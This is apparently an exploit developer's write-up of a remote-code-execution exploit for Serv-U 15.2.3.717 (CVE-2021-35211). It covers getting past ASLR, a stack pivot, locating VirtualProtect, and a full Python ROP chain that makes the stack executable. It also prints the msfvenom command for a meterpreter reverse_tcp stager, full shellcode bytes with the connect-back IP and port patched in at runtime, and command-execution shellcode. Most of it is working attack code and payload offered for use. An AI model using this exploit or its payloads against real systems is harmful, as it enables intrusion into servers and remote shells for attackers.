## Summarizing the exploit development
I'd like to summarize how I eventually ended up approaching this exploit. It all started with a requirement for an exploit and a [link to a PoC for Serv-U 15.2.3.717](https://github.com/NattiSamson/Serv-U-CVE-2021-35211/blob/main/CVE-2021-35211_PoC.py). The PoC triggers the bug in Serv-U and places a user-controllable value into the `rip` register via a `call r9` instruction, where the 8-byte `r9` value can be chosen by the user/attacker.

Let's break it down into sections:

1. Figure out what address to put into `r9`
2. Defeat ASLR to enable the above
3. Pivot the stack to point at our ROP chain
4. Develop a technique to find `kernel32!VirtualProtect`
5. Identify useful ROP gadgets to do (4)
6. Build a ROP chain to change page protection on the stack from R-X to RWX
7. Tweak the ROP chain to jump to shellcode on the newly-executable stack
8. Make the shellcode generic enough to be flexible for the user
9. ???
10. Profit!


### Where to jump? ASLR? Stack pivot?
The first 3 points above are all intertwined, so I'll deal with them at the same time. The question is: what memory address should we put in `r9` in order to kickstart our ROP chain exploit? We must solve for:

* We only get to jump to one memory address. That's it.
* Due to ASLR, most memory addresses will be different every time Serv-U is launched.
* The stack pointer (`rsp`) does not point to a user-controlled memory space at the time `call r9` happens. This means that we can't simply `ret` to our ROP buffer after `call r9` and we'll need to replace the stack pointer with one of our own that points to our ROP buffer... and we only get one chance to do it!

Whew. Tricksy. Fortunately the stars aligned on this bug and it's pretty easy to work around those three problems. First up: ASLR. 

### Stack Pivot
We can't stack pivot or reliably jump to a useful instruction until we've found useful non-ASLR addresses. In this case we're lucky because the base pointer register (`rbp`) points to the start of our ROP buffer at the time `call r9` is executed. If we can find a ROP gadget that does the equivalent of `mov rsp, rbp` then we're good. We'll `call r9`, jump to our ROP gadget which does `mov rsp, rbp` followed by `ret`, which pops another gadget address off the stack (which now points at our buffer) and the ROP chain starts up.

As shown earlier, `Serv-U.dll` does not have ASLR enabled! Crazy but true. Using a combination of [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) and [Radare2](https://rada.re/n/) I found this gadget:

```
000000018010391a 498BE3                 mov        rsp, r11
000000018010391d 415E                   pop        r14
000000018010391f C3                     ret
```

It just so happened that at the time of `call r9`, the register `r11` contained a pointer to `rbp`. Wow, lucky stroke! So the address `0x18010391a` became the value placed into the payload buffer as our first ROP gadget address.

### Find `kernel32!VirtualProtect`
The function `VirtualProtect` is used to change the protection flags for regions of memory, which lets us set the stack to executable (RWX). I checked the import table of `Serv-U.dll`, but it didn't import VirtualProtect, so the easiest way of getting the correct address (direct reference) wouldn't work. Instead we have to fall back on calculating the offset to `VirtualProtect` based on a known address of another unrelated `kernel32.dll` imported address.

I picked one of the first `kernel32.dll` imports, `GetCurrentThreadID`:

![image.png](https://images.zenhubusercontent.com/614259e8ba17b31c3a6dd14f/e4b20715-3d2d-4b5f-947e-d5bf2380d8e4)

The address `0x1801c92a0` is a trampoline stub built into `Serv-U.dll` that, when jumped to, redirects execution to the real `kernel32!GetCurrentThreadID` that's been mapped into Serv-U's process space by the operating system's library loader. In other words, the value stored at address `0x0x1801c92a0` is a pointer to the real `GetCurrentThreadId` function. Let's dereference it in the debugger and double-check that it matches the real address of `GetCurrentThreadId` in this context. First, dereference the trampoline in `Serv-U.dll`:

```
0:026> u poi(0x1801c92a0)
KERNEL32!GetCurrentThreadId:
00007ff8`b63d5e80 65488b042530000000 mov   rax,qword ptr gs:[30h]
00007ff8`b63d5e89 8b4048          mov     eax,dword ptr [rax+48h]
00007ff8`b63d5e8c c3              ret
```

Then dump the address using debugger commands:

```
0:026> u kernel32!GetCurrentThreadId
KERNEL32!GetCurrentThreadId:
00007ff8`b63d5e80 65488b042530000000 mov   rax,qword ptr gs:[30h]
00007ff8`b63d5e89 8b4048          mov     eax,dword ptr [rax+48h]
00007ff8`b63d5e8c c3              ret
```

That's a match. Ok, find `VirtualProtect`:

```
0:026> u kernel32!VirtualProtectStub
KERNEL32!VirtualProtectStub:
00007ff8`b63db990 48ff25914f0600  jmp     qword ptr [KERNEL32!_imp_VirtualProtect (00007ff8`b6440928)]
00007ff8`b63db997 cc              int     3
```

Looks like `VirtualProtect` is at `0x00007ff8b63db990`. Doing the math shows us that `0x00007ff8b63db990 - 0x00007ff8b63d5e80 = 0x5B10`, which means that `VirtualProtect` is 0x5B10 bytes after `GetCurrentThreadId` in `kernel32.dll`. This applies regardless of ASLR. Double check:

```
0:026> u kernel32!GetCurrentThreadId + 0x5b10
KERNEL32!VirtualProtectStub:
00007ff8`b63db990 48ff25914f0600  jmp     qword ptr [KERNEL32!_imp_VirtualProtect (00007ff8`b6440928)]
00007ff8`b63db997 cc              int     3
```

Voila! A reliable way to calculate the address of `VirtualProtect` using static information from `Serv-U.dll`.

### Identify ROP gadgets
I started by sketching out a rough plan of what I wanted to achieve.

* Stack pivot
* Calculate address of `VirtualProtect`
* Setup the 4 parameters required for `VirtualProtect`
* Call it
* Load the address of our payload buffer's NOP sled + shellcode
* Jump to that address

It takes a bit of trial and error to build up the gadget chain because we're limited to the gadgets available in `Serv-U.dll`. So I spent some time finding useful gadgetry. What constitutes "useful"? 

* Simple and short. E.g. `mov rax, rbx ; ret` is much better than `mov rax, rbx; mov rax, qword ptr [rax+10h]; pop rcx; ret` because the latter stomps on the values we want and it also messes with the stack due to the `pop` instruction. Simple is good in ROP.
* Manipulation of argument-passing registers on x64. Gadgets that allow us to `pop` values off the stack into the 4 argument-passing registers (`rcx`, `rdx`, `r8`, and `r9`, respectively) are super useful for calling into functions. So for example these gadgets are solid gold:
  * `pop rcx ; ret`
  * `pop rdx ; ret`
  * `pop r8 ; ret`
  * `pop r9 ; ret`
* Good luck finding a `pop r9`. Alternatives include multi-step gadgets to load another register with your desired value and swap it into the target register, like so:
  * `pop rax ; xchg r9, rax ; ret`
  * `push rax ; pop r9 ; ret`
* Flow control gadgets like `jmp rax ; ret` or `call rbx ; ret` can be chained together like so:
  * `pop rax`
  * `jmp rax`

I spent some time collecting those gadgets and then used them to construct a real ROP chain. Sometimes it doesn't work out and you need to spend forever thinking up alernative ways of doing the job you need done. For example, I spent *hours* trying to find a way to put arbitrary values in the `r9` register when calling into `VirtualProtect`. Eventually I settled on a multi-part chain:

```
pop rax ; ret
xchg rax, r9 ; adc al, 0 ; add rsp, 0x38 ; ret
```

It was a compromise because I really didn't want to have 0x38 bytes of my payload eaten up by `add rsp, 0x38`, but it's all I had so I went with it. In the end I built the following chain:

```
    # Setup the stack so our payload is in the correct place
    write_qw(ROP_r9_offset, ROP_stack_pivot) # populate r9

    # skip right on over the start of the rop buffer, which we'll use as a scratch pad
    write_rop(ROP_add_rsp_0x28)
    ropOffs = ropOffs + 0x28

    # first arg to virtualprotect, the address to make RWX
    write_rop(ROP_push_rbp_pop_rax)        # put stack address into rax
    write_rop(ROP_mov_rcx_rax)             # copy stack address to rcx (address parameter)
    ropOffs = ropOffs + 0x28

    # second arg, the size of the executble segment
    write_rop(ROP_pop_rdx)                 # pop the size parameter off the stack
    write_rop(alloc_size+0x8000)

    # third arg, the virtual protection flags for RWX
    write_rop(ROP_pop_r8)                  # pop the value 0x40 off the stack (page protection flags for RWX)
    write_rop(0x40)

    # fourth arg, a writable address in memory into which VirtualProtect will write result data
    write_rop(ROP_pop_rax)                 # Pop a writable memory address off the stack
    write_rop(writable_mem)
    write_rop(ROP_xchg_rax_r9)             # swap it into r9 for the final argument
    ropOffs = ropOffs + 0x38
    write_rop(ROP_pop_rax)                 # populate rax with pointer to the known trampoline for kernel32!GetCurrentThreadId
    write_rop(imp_GetCurrentThreadId)

    # skip over critical sections of the payload buffer that seem to get modified during execution
    write_rop(ROP_add_rsp_0x28)
    ropOffs = ropOffs + 0x28
    write_rop(ROP_add_rsp_0x28)
    ropOffs = ropOffs + 0x28

    # get the address of kernel32!VirtualProtect's trampoline
    write_rop(ROP_mov_rax_ptr_rax)         # move address of kernel32!GetCurrentThreadId trampoline into rax
    ropOffs = ropOffs + 0x20
    write_rop(0x4124434445464748)          # Dummy value gets pop'd off the stack in the above gadget
    write_rop(ROP_pop_rdx)                 # populate rdx with the offset from GetCurrentThreadId to VirtualProtect
    write_rop(offs_VirtualProtect)
    write_rop(ROP_pop_rdx)                 # populate rdx with the offset from GetCurrentThreadId to VirtualProtect
    write_rop(offs_VirtualProtect)
    write_rop(ROP_pop_rdx)                 # populate rdx with the offset from GetCurrentThreadId to VirtualProtect
    write_rop(offs_VirtualProtect)
    write_rop(ROP_pop_rdx)                 # populate rdx with the offset from GetCurrentThreadId to VirtualProtect
    write_rop(offs_VirtualProtect)
    write_rop(ROP_add_rax_rdx)             # calculate the address of VirtualProtect and put it in rax

    # call VirtualProtect to make the stack executable
    write_rop(ROP_jmp_rax)                 # call Kernel32!VirtualProtect()

    # skip over critical sections of the payload buffer that seem to get modified during execution
    write_rop(ROP_add_rsp_0x28)
    ropOffs = ropOffs + 0x28

    # jump to our shellcode
    write_rop(ROP_push_rbp_pop_rax)        # put stack address into rax
    write_rop(ROP_pop_rdx)                 # pop the NOP sled offset value off the stack into rdx
    write_rop(offs_NOP_sled)               
    write_rop(ROP_add_rax_rdx)             # add together the stack address + NOP sled offset
    write_rop(ROP_jmp_rax)                 # jmp to the NOP sled
    
    # fall back into a sleep function to wait forever instead of crashing the process
    write_rop(ROP_pop_rax)                 # populate rax with pointer to the known trampoline for kernel32!sleep
    write_rop(imp_sleep)

    # get the address of kernel32!sleep's trampoline
    write_rop(ROP_mov_rax_ptr_rax)         # move address of kernel32!GetCurrentThreadId trampoline into rax
    ropOffs = ropOffs + 0x20
    write_rop(0x4124434445464748)          # Dummy value gets pop'd off the stack in the above gadget
    write_rop(ROP_pop_rcx)                 # populate rcx (first arg for sleep) with the INFINITE (-1) value
    write_rop(0xFFFFFFFFFFFFFFFF)
    write_rop(ROP_jmp_rax)                 # jmp sleep()
```

### Shellcode
I took standard shellcode generated by `msfvenom` and patched it at exploit runtime to do my bidding. For example, consider the Metasploit-compatible shellcode stager. It's generated like so:

```
[2021-10-19T18:47:49Z] root@h:/ehome/haggis# msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=192.153.76.22 LPORT=443 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of c file: 2166 bytes
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1"
"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
"\x49\xbc\x02\x00\x01\xbb\xc0\x99\x4c\x16\x41\x54\x49\x89\xe4"
"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"
"\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
"\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40"
"\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";
```

The IP address to which the shellcode connects to download the 2nd-stage shellcode is at these offsets:

```
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1"
"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
"\x49\xbc\x02\x00"
"PP"   # connect-back port       @ offs 244
"HHHH" # connect-back IP address @ offs 246 
"\x41\x54\x49\x89\xe4"
"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"
"\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"
"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
"\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40"
"\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"
"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
"\xff\xe7\x58"
```

My exploit simply patches in the IP:port specified on the command-line at runtime. This makes it easy for the user/attacker to use arbitrary shellcode stagers / Sliver instances / Metasploit instances at runtime without having to generate new shellcode every time.

I used the same trick for the command exec shellcode, which simply tacks on the user-specified commands to the end of the shellcode:

```
shellcode = (
     b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
     b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
     b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
     b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
     b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
     b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
     b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
     b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
     b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
     b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
     b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
     b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
     b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
     b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
     b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
     b"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
     b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
     b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
)

rop[offs_NOP_sled+offs_NOP_sled_padding+267:] = shellcode + cmd.encode() + b"\x00"
```

Again, this saves the user generating new shellcode every time.

### In Summary
This was a fun exploit and I got lucky a few times! The fact that ASLR was disabled on the Serv-U dll was crazy lucky. 

It should also be pointed out that the exploit is currently hard-coded for Serv-U 15.2.3.717 on Windows Datacenter 2022. To run on other Windows versions would require a little work to calculate the offset between `GetCurrentThreadId` and `VirtualProtect` in `kernel32.dll`, which is almost certainly different across windows versions.

Similarly, the same would have to be done to recalculate the ROP gadget addresses in `Serv-U.dll` for other versions of Serv-U. Hopefully we'd find the same gadgets in the other versions!
